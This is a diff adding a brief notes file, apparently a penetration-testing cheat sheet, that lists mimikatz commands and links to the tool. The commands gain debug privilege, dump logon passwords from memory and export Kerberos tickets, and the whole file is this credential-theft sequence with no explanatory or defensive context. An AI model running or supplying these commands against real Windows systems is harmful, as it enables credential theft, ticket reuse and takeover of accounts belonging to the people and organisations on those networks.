@@ -1,0 +1,9 @@
+
+- mimikatz # privilege::debug
+- mimikatz # sekurlsa::logonpasswords
+- mimikatz # sekurlsa::tickets /export
+- mimikatz # kerberos::list /export
+
+
+https://github.com/gentilkiwi/mimikatz
+http://blog.gentilkiwi.com/mimikatz
